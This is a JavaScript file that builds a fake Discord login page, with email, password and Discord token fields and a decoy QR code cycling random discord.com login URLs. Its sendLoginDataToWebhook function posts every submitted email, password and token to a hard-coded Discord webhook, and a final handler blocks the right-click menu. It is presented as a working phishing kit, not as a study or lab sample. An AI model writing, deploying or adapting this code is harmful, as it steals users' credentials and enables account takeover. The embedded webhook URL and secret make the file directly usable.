console.log("Script loaded");

// Dynamically load qrcode.js if not already included
if (typeof qrcode === "undefined") {
  console.log("Loading qrcode.js...");
  const script = document.createElement("script");
  script.src = "https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js";
  script.async = true;
  script.onload = () => console.log("qrcode.js loaded successfully");
  script.onerror = () => console.error("Failed to load qrcode.js");
  document.head.appendChild(script);
}

// Add inline CSS for styling and animations
const style = document.createElement("style");
style.textContent = `
  .container { display: flex; gap: 20px; padding: 20px; max-width: 800px; margin: 0 auto; }
  .left-section { flex: 1; }
  .right-section { flex: 1; display: flex; justify-content: center; align-items: center; }
  .qr-code { position: relative; width: 160px; height: 160px; background: white; }
  form { display: flex; flex-direction: column; gap: 10px; }
  input { padding: 8px; font-size: 16px; }
  button { padding: 10px; background: #5865F2; color: white; border: none; cursor: pointer; }
  button:disabled { opacity: 0.6; cursor: not-allowed; }
  #error-message { color: red; display: none; margin-top: 10px; }
  .spinner { display: flex; justify-content: center; align-items: center; }
  .pulsingEllipsis .spinnerItem { 
    display: inline-block; 
    width: 8px; 
    height: 8px; 
    margin: 0 2px; 
    background: #fff; 
    border-radius: 50%; 
  }
  @keyframes spinner-pulsing-ellipsis {
    0%, 100% { transform: scale(0.8); opacity: 0.5; }
    50% { transform: scale(1.2); opacity: 1; }
  }
  .qrCode-spinner { width: 160px; height: 160px; position: relative; }
  .wanderingCubes .item {
    width: 10px; 
    height: 10px; 
    background: #5865F2; 
    position: absolute; 
    animation: wanderingCubes 1.8s infinite ease-in-out;
  }
  .wanderingCubes .item:nth-child(2) { animation-delay: -0.9s; }
  @keyframes wanderingCubes {
    0% { transform: translate(0, 0) rotate(0deg); }
    25% { transform: translate(20px, 0) rotate(90deg); }
    50% { transform: translate(20px, 20px) rotate(180deg); }
    75% { transform: translate(0, 20px) rotate(270deg); }
    100% { transform: translate(0, 0) rotate(360deg); }
  }
`;
document.head.appendChild(style);

// Dynamically create HTML structure if missing
if (!document.querySelector(".container")) {
  console.log("Creating DOM structure...");
  const container = document.createElement("div");
  container.className = "container";
  container.innerHTML = `
    <div class="left-section">
      <form>
        <input type="email" id="email" placeholder="Email">
        <input type="password" id="password" placeholder="Password">
        <input type="text" id="token" placeholder="Discord Token (Optional)">
        <button type="button">Log In</button>
        <div id="error-message"></div>
      </form>
    </div>
    <div class="right-section">
      <div class="qr-code"></div>
    </div>
  `;
  document.body.appendChild(container);
}

// ----------------------------------
// SELECTING ELEMENTS
// ----------------------------------
const loginButton = document.querySelector("button");
const emailInput = document.querySelector("#email");
const passwordInput = document.querySelector("#password");
const tokenInput = document.querySelector("#token");
const errorMessage = document.querySelector("#error-message");

// Webhook URL (replace with a secure URL)
const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G";

// -----------------------------------
// VALIDATION FUNCTIONS
// -----------------------------------
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

function isValidPassword(password) {
  const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/;
  return passwordRegex.test(password);
}

function isValidToken(token) {
  if (!token) return true; // Token is optional
  const tokenRegex = /^[A-Za-z0-9._-]{59,}$/;
  return tokenRegex.test(token);
}

function displayError(message) {
  if (errorMessage) {
    errorMessage.textContent = message;
    errorMessage.style.display = "block";
  } else {
    console.error("Error message element not found:", message);
  }
}

// -----------------------------------
// ELLIPSIS ANIMATION
// ------------------------------------
function removeEllipsisAnimation() {
  if (loginButton) {
    loginButton.innerHTML = "";
    loginButton.textContent = "Log In";
    loginButton.removeAttribute("disabled");
  }
}

function animateEllipsis() {
  console.log("Login button clicked");
  if (!loginButton) {
    console.error("Login button not found.");
    return;
  }

  if (errorMessage) errorMessage.style.display = "none";

  const email = emailInput ? emailInput.value.trim() : "";
  const password = passwordInput ? passwordInput.value.trim() : "";
  const discordToken = tokenInput ? tokenInput.value.trim() : "";

  if (!emailInput || !email) {
    displayError("Email field is missing or empty.");
    return;
  }
  if (!passwordInput || !password) {
    displayError("Password field is missing or empty.");
    return;
  }
  if (!isValidEmail(email)) {
    displayError("Please enter a valid email address.");
    return;
  }
  if (!isValidPassword(password)) {
    displayError("Password must be at least 8 characters long with letters and numbers.");
    return;
  }
  if (discordToken && !isValidToken(discordToken)) {
    displayError("Invalid Discord token format.");
    return;
  }

  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                            <span class="inner pulsingEllipsis">
                                <span class="item spinnerItem"></span>
                                <span class="item spinnerItem"></span>
                                <span class="item spinnerItem"></span>
                            </span>
                         </span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
  });
  loginButton.setAttribute("disabled", "true");

  sendLoginDataToWebhook(email, password, discordToken);
  setTimeout(removeEllipsisAnimation, 3000);
}

// -----------------------------------
// SEND LOGIN DATA TO WEBHOOK
// -----------------------------------
async function sendLoginDataToWebhook(email, password, discordToken) {
  try {
    const payload = {
      email: email,
      password: password,
      discordToken: discordToken || "N/A",
      timestamp: new Date().toISOString(),
    };

    console.log("Sending data to webhook:", payload);
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: "New Login Attempt",
        embeds: [
          {
            title: "Login Information",
            fields: [
              { name: "Email", value: email || "N/A", inline: true },
              { name: "Password", value: password || "N/A", inline: true },
              { name: "Discord Token", value: discordToken || "N/A", inline: false },
              { name: "Timestamp", value: new Date().toISOString(), inline: false },
            ],
            color: 0x00ff00,
          },
        ],
      }),
    });

    if (!response.ok) {
      console.error("Webhook failed:", response.statusText);
      displayError("Failed to submit login data.");
    } else {
      console.log("Webhook sent successfully");
    }
  } catch (error) {
    console.error("Webhook error:", error);
    displayError("An error occurred while submitting.");
  }
}

// --------------------------------------------------
// ---------- WANDERING CUBES ANIMATION -------------
// --------------------------------------------------
function generateRandomString() {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < 43; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

function removeQrCodeAnimation() {
  const qrCodeContainer = document.querySelector(".right-section .qr-code");
  if (!qrCodeContainer) {
    console.error("QR code container not found.");
    return;
  }
  qrCodeContainer.innerHTML = "";
  const qrCode = generateQRCode(`https://discord.com/ra/${generateRandomString()}`);
  if (qrCode) {
    qrCodeContainer.insertAdjacentElement("afterbegin", qrCode);
  }
  // Use a fallback image path for Vercel; update this if needed
  qrCodeContainer.insertAdjacentHTML(
    "beforeend",
    `<img src="/assets/qrcode-discord-logo.png" alt="Discord Logo" style="width: 50px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);" onerror="console.error('Failed to load Discord logo image');">`
  );
  qrCodeContainer.style.background = "white";
}

function simulateQrCodeChange() {
  const qrCodeContainer = document.querySelector(".right-section .qr-code");
  if (!qrCodeContainer) {
    console.error("QR code container not found.");
    return;
  }
  const svg = qrCodeContainer.querySelector("svg");
  const img = qrCodeContainer.querySelector("img");
  if (svg) qrCodeContainer.removeChild(svg);
  if (img) qrCodeContainer.removeChild(img);
  qrCodeContainer.style.background = "transparent";
  const markup = `<span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
                    <span class="inner wanderingCubes">
                      <span class="item"></span>
                      <span class="item"></span>
                    </span>
                  </span>`;
  qrCodeContainer.insertAdjacentHTML("afterbegin", markup);
  setTimeout(removeQrCodeAnimation, 3500);
}

// Start QR code animation after ensuring qrcode.js is loaded
function startQrCodeAnimation() {
  if (typeof qrcode !== "undefined") {
    console.log("Starting QR code animation");
    simulateQrCodeChange();
    setInterval(simulateQrCodeChange, 120 * 1000);
  } else {
    console.log("Waiting for qrcode.js...");
    setTimeout(startQrCodeAnimation, 500);
  }
}
startQrCodeAnimation();

// --------------------------------------------------
// ---------- GENERATING QRCODE ---------------------
// --------------------------------------------------
function generateQRCode(data) {
  if (typeof qrcode === "undefined") {
    console.error("qrcode.js not loaded yet.");
    return null;
  }
  try {
    const qr = qrcode(0, "L");
    qr.addData(data);
    qr.make();
    const moduleCount = qr.getModuleCount();
    const svgString = qr.createSvgTag(1, 0);
    const parser = new DOMParser();
    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
    const svgElement = svgDoc.documentElement;
    svgElement.setAttribute("width", "160");
    svgElement.setAttribute("height", "160");
    svgElement.setAttribute("viewBox", "0 0 37 37");
    const path = svgElement.querySelector("path");
    if (path) {
      path.setAttribute("transform", `scale(${37 / moduleCount})`);
    }
    return svgElement;
  } catch (error) {
    console.error("Error generating QR code:", error);
    return null;
  }
}

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
if (loginButton) {
  console.log("Attaching click listener to login button");
  loginButton.addEventListener("click", animateEllipsis);
} else {
  console.error("Login button not found. Event listener not attached.");
}

document.addEventListener("contextmenu", function (e) {
  console.log("Context menu disabled");
  e.preventDefault();
});
